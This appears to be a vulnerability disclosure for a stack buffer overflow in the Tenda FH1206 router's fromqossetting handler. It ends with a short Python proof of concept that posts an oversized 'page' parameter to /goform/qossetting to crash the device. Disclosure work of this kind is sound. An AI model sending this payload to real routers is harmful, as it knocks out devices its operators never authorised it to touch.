## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromqossetting` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v7, "qos_list.asp?page=%s", v4);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v7` array, thus triggering this security vulnerability.

![image](https://github.com/user-attachments/assets/e3cff71c-8b6a-4e16-b40c-5eeef7645cc0)


```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/qossetting"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)
